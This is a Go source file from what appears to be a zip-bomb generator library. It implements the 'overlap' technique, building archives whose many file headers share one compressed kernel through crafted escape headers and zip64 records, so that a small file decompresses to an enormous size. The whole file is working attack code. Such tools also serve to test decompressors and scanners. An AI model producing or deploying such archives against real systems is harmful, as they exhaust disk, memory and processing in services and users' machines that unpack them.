package overlap

import (
	"bufio"
	"encoding/binary"
	"errors"
	"hash/crc32"
	"io"

	"github.com/hupe1980/zipbomb/pkg/filename"
)

var (
	errLongName    = errors.New("name too long")
	errLongExtra   = errors.New("extra too long")
	errLongComment = errors.New("comment too long")
)

type OnFileCreateHookFunc = func(name string)

type Options struct {
	FilenameGen      filename.Generator
	EOCDComment      string
	OnFileCreateHook OnFileCreateHookFunc
	CompressionLevel int // -2 - 9
}

type cdHeader struct {
	*fileHeader
	offset uint64
}

type ZipBomb struct {
	cw               *countWriter
	dir              []*cdHeader //central directory
	uncompressedSize int64
	zip64            bool
	kernelName       string
	kernelSize       uint64
	opts             Options
}

// New returns a new overlap zip bomb.
func New(w io.Writer, optFns ...func(o *Options)) (*ZipBomb, error) {
	opts := Options{
		FilenameGen:      filename.NewDefaultGenerator(filename.DefaultAlphabet, ""),
		CompressionLevel: 5,
	}

	for _, fn := range optFns {
		fn(&opts)
	}

	if len(opts.EOCDComment) > uint16max {
		return nil, errLongComment
	}

	return &ZipBomb{
		cw:   &countWriter{w: bufio.NewWriter(w)},
		opts: opts,
	}, nil
}

type fileRecord struct {
	header *fileHeader
	data   []byte
}

func (zb *ZipBomb) Generate(kernelBytes []byte, numFiles int) error {
	k, err := newKernel(zb.opts.FilenameGen.Generate(numFiles-1), kernelBytes, zb.opts.CompressionLevel)
	if err != nil {
		return err
	}

	zb.kernelName = k.Name()
	zb.kernelSize = k.UncompressedSize()

	files := []fileRecord{
		{
			header: k.LocalFileHeader(),
			data:   k.compressedBytes,
		},
	}

	zb.uncompressedSize = zb.uncompressedSize + int64(k.UncompressedSize())

	for fi := 1; fi < numFiles; fi++ {
		next := files[0]

		headerBytes, err := next.header.MarshalBinary()
		if err != nil {
			return err
		}

		crc32 := crc32.NewIEEE()

		crc32.Write(headerBytes)

		numEscaped := uint16(len(headerBytes))

		for i := 1; i < len(files); i++ {
			headerBytes, err := files[i].header.MarshalBinary()
			if err != nil {
				return err
			}

			if numEscaped+uint16(len(files[i-1].data))+uint16(len(headerBytes)) > uint16max {
				break
			}

			numEscaped = numEscaped + uint16(len(files[i-1].data)) + uint16(len(headerBytes))

			crc32.Write(files[i-1].data)
			crc32.Write(headerBytes)

			next = files[i]
		}

		crc32.Write(k.Bytes())

		escape := newEscape(zb.opts.FilenameGen.Generate(numFiles-1-fi), next.header, numEscaped, crc32)

		files = append([]fileRecord{{
			header: escape.LocalFileHeader(),
			data:   escape.Data(),
		}}, files...)

		zb.uncompressedSize = zb.uncompressedSize + int64(escape.LocalFileHeader().UncompressedSize)

		if zb.opts.OnFileCreateHook != nil {
			zb.opts.OnFileCreateHook(escape.Name())
		}
	}

	for _, file := range files {
		cdHeader := &cdHeader{
			fileHeader: file.header,
			offset:     uint64(zb.cw.count),
		}

		zb.dir = append(zb.dir, cdHeader)

		headerBytes, err := file.header.MarshalBinary()
		if err != nil {
			return err
		}

		if _, err := zb.cw.Write(headerBytes); err != nil {
			return err
		}

		if _, err := zb.cw.Write(file.data); err != nil {
			return err
		}
	}

	return zb.close()
}

func (zb *ZipBomb) UncompressedSize() int64 {
	return zb.uncompressedSize
}

func (zb *ZipBomb) IsZip64() bool {
	return zb.zip64
}

func (zb *ZipBomb) KernelName() string {
	return zb.kernelName
}

func (zb *ZipBomb) KernelSize() uint64 {
	return zb.kernelSize
}

func (zb *ZipBomb) close() error {
	// write central directory
	start := zb.cw.count

	for _, h := range zb.dir {
		var buf [directoryHeaderLen]byte
		b := writeBuf(buf[:])
		b.uint32(uint32(directoryHeaderSignature))
		b.uint16(h.CreatorVersion)
		b.uint16(h.ReaderVersion)
		b.uint16(h.Flags)
		b.uint16(h.Method)
		b.uint16(h.ModifiedTime)
		b.uint16(h.ModifiedDate)
		b.uint32(h.CRC32)

		if h.IsZip64() || h.offset >= uint32max {
			// the file needs a zip64 header. store maxint in both
			// 32 bit size fields (and offset later) to signal that the
			// zip64 extra header should be used.
			b.uint32(uint32max) // compressed size
			b.uint32(uint32max) // uncompressed size

			// append a zip64 extra block to Extra
			var buf [28]byte // 2x uint16 + 3x uint64
			eb := writeBuf(buf[:])
			eb.uint16(zip64ExtraID)
			eb.uint16(24) // size = 3x uint64
			eb.uint64(h.UncompressedSize64)
			eb.uint64(h.CompressedSize64)
			eb.uint64(h.offset)
			h.Extra = append(h.Extra, buf[:]...)
		} else {
			b.uint32(h.CompressedSize)
			b.uint32(h.UncompressedSize)
		}

		b.uint16(uint16(len(h.Name)))
		b.uint16(uint16(len(h.Extra)))
		b.uint16(uint16(len(h.Comment)))
		b = b[4:] // skip disk number start and internal file attr (2x uint16)
		b.uint32(h.ExternalAttrs)

		if h.offset > uint32max {
			b.uint32(uint32max)
		} else {
			b.uint32(uint32(h.offset))
		}

		if _, err := zb.cw.Write(buf[:]); err != nil {
			return err
		}

		if _, err := io.WriteString(zb.cw, h.Name); err != nil {
			return err
		}

		if _, err := zb.cw.Write(h.Extra); err != nil {
			return err
		}

		if _, err := io.WriteString(zb.cw, h.Comment); err != nil {
			return err
		}
	}

	end := zb.cw.count

	records := uint64(len(zb.dir))
	size := uint64(end - start)
	offset := uint64(start)

	if records >= uint16max || size >= uint32max || offset >= uint32max {
		zb.zip64 = true

		var buf [directory64EndLen + directory64LocLen]byte
		b := writeBuf(buf[:])

		// zip64 end of central directory record
		b.uint32(directory64EndSignature)
		b.uint64(directory64EndLen - 12) // length minus signature (uint32) and length fields (uint64)
		b.uint16(zipVersion45)           // version made by
		b.uint16(zipVersion45)           // version needed to extract
		b.uint32(0)                      // number of this disk
		b.uint32(0)                      // number of the disk with the start of the central directory
		b.uint64(records)                // total number of entries in the central directory on this disk
		b.uint64(records)                // total number of entries in the central directory
		b.uint64(size)                   // size of the central directory
		b.uint64(offset)                 // offset of start of central directory with respect to the starting disk number

		// zip64 end of central directory locator
		b.uint32(directory64LocSignature)
		b.uint32(0)           // number of the disk with the start of the zip64 end of central directory
		b.uint64(uint64(end)) // relative offset of the zip64 end of central directory record
		b.uint32(1)           // total number of disks

		if _, err := zb.cw.Write(buf[:]); err != nil {
			return err
		}

		// store max values in the regular end record to signal
		// that the zip64 values should be used instead
		records = uint16max
		size = uint32max
		offset = uint32max
	}

	// write end record
	var buf [directoryEndLen]byte
	b := writeBuf(buf[:])
	b.uint32(uint32(directoryEndSignature))
	b = b[4:]                                  // skip over disk number and first disk number (2x uint16)
	b.uint16(uint16(records))                  // number of entries this disk
	b.uint16(uint16(records))                  // number of entries total
	b.uint32(uint32(size))                     // size of directory
	b.uint32(uint32(offset))                   // start of directory
	b.uint16(uint16(len(zb.opts.EOCDComment))) // byte size of EOCD comment

	if _, err := zb.cw.Write(buf[:]); err != nil {
		return err
	}

	if _, err := io.WriteString(zb.cw, zb.opts.EOCDComment); err != nil {
		return err
	}

	return zb.cw.w.(*bufio.Writer).Flush()
}

type countWriter struct {
	w     io.Writer
	count int64
}

func (w *countWriter) Write(p []byte) (int, error) {
	n, err := w.w.Write(p)
	w.count += int64(n)

	return n, err
}

type writeBuf []byte

func (b *writeBuf) uint8(v uint8) {
	(*b)[0] = v
	*b = (*b)[1:]
}

func (b *writeBuf) uint16(v uint16) {
	binary.LittleEndian.PutUint16(*b, v)
	*b = (*b)[2:]
}

func (b *writeBuf) uint32(v uint32) {
	binary.LittleEndian.PutUint32(*b, v)
	*b = (*b)[4:]
}

func (b *writeBuf) uint64(v uint64) {
	binary.LittleEndian.PutUint64(*b, v)
	*b = (*b)[8:]
}
